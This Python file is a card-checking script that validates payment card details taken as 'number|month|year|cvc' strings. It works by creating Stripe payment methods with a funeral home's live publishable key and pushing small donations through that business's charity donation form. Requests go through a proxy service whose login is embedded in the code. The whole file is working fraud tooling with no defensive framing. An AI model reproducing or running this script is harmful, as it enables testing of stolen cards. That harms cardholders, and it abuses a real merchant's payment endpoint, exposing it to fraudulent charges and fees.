import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		card_type = "Visa"
	if n.startswith("5"):
		card_type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	cookies = {
	    'm': '1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b',
	}
	
	headers = {
	    'authority': 'm.stripe.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'text/plain;charset=UTF-8',
	    # 'cookie': 'm=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b',
	    'origin': 'https://m.stripe.network',
	    'referer': 'https://m.stripe.network/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'JTdCJTIybXVpZCUyMiUzQSUyMjhjZDlhYzliLTdhOWEtNGVmNC05NzhmLTg2OWU4YzQ0ZTI5OWVlYjgyYyUyMiUyQyUyMnNpZCUyMiUzQSUyMmE4ODE4MTBkLWQzZjgtNGE0Yi05ZmIxLTJjZjRmOWJmMTgzNmEzMzM0NCUyMiUyQyUyMnVybCUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC51NzZiQ3hkOGhfQktpbEozN1phT01XZzlxaDVPODhEQWRaVkFqYlVxY0trLmtzNnR2ODl3R1VxVmlOaE00VGhpN21xeWZYWVNzUklXY3FfUjBfelBYRmslMkZNYndLYW5CRFdURFIyTTFfV0k0UkN3T0hFT01iRlJ6WlV4NkdMUlNPQkNnJTJGJTIyJTJDJTIyc291cmNlJTIyJTNBJTIybW91c2UtdGltaW5ncy0xMC12MiUyMiUyQyUyMmRhdGElMjIlM0ElNUIlNUQlN0Q': '',
	}
	
	response = requests.post('https://m.stripe.com/6', cookies=cookies, headers=headers, data=data)
	
	muid = re.search(r'"muid":"(.*?)"', response.text).group(1)
	sid = re.search(r'"sid":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Rodam+User&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Faa85643f31%3B+stripe-js-v3%2Faa85643f31%3B+card-element&referrer=https%3A%2F%2Fwww.corriganfunerals.ie&time_on_page=68889&client_attribution_metadata[client_session_id]=085106fc-24c7-4d7d-b07f-cc4d2a5feabf&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51IGU0GIHh0fd2MZ32oi6r6NEUMy1GP19UVxwpXGlx3VagMJJOS0EM4e6moTZ4TUCFdX2HLlqns5dQJEx42rvhlfg003wK95g5r'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '__stripe_mid': f'{muid}',
	    '__stripe_sid': f'{sid}',
	}
	
	headers = {
	    'authority': 'www.corriganfunerals.ie',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.corriganfunerals.ie',
	    'referer': 'https://www.corriganfunerals.ie/help-a-family/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wp_full_stripe_inline_donation_charge',
	    'wpfs-form-name': 'help-a-family-with-cost',
	    'wpfs-form-get-parameters': '%7B%7D',
	    'wpfs-custom-amount': 'other',
	    'wpfs-custom-amount-unique': '1',
	    'wpfs-donation-frequency': 'one-time',
	    'wpfs-custom-input[]': [
	        'Rodam User',
	        '1usd',
	        '4303000850',
	    ],
	    'wpfs-card-holder-email': 'rodamuser08@gmail.com',
	    'wpfs-card-holder-name': 'Rodam User',
	    'wpfs-stripe-payment-method-id': pm,
	}
	
	response = session.post('https://www.corriganfunerals.ie/cfajax', cookies=cookies, headers=headers, data=data)
	
	result = re.search(r'"message":"(.*?)"', response.text).group(1)
		
	return (result)
